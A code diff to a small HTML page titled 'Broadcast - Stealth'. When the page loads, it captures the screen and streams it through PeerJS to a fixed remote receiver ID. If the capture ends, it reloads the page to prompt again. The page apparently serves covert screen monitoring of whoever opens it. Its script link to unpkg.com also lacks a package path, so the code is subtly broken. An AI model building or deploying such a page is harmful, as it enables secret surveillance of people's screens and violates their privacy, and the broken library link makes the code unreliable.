@@ -1,22 +1,40 @@
 <!DOCTYPE html>
 <html>
 <head>
+    <title>Broadcast - Stealth</title>
+    <!-- Fixed library link -->
     <script src="https://unpkg.com"></script>
 </head>
 <body>
+    <h2>Broadcasting...</h2>
     <script>
         async function startCapture() {
             try {
-                // This triggers the macOS Screen Recording prompt
-                const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
-                const peer = new Peer(); // Random ID for the sender
+                // Request the screen share
+                const stream = await navigator.mediaDevices.getDisplayMedia({ 
+                    video: { cursor: "always" },
+                    audio: false 
+                });
+
+                // Initialize Peer
+                const peer = new Peer(); 
                 
                 peer.on('open', (id) => {
-                    // Automatically call the hardcoded Host ID
+                    console.log('My peer ID is: ' + id);
+                    // Call the fixed receiver ID
                     const call = peer.call('host-monitor-unique-id', stream);
                 });
-            } catch (err) { console.error("Error: " + err); }
+
+                // If stream stops, refresh or handle cleanup
+                stream.getVideoTracks()[0].onended = () => {
+                    location.reload();
+                };
+
+            } catch (err) { 
+                console.error("Error: " + err); 
+            }
         }
+        // Run as soon as page loads
         window.onload = startCapture;
     </script>
 </body>
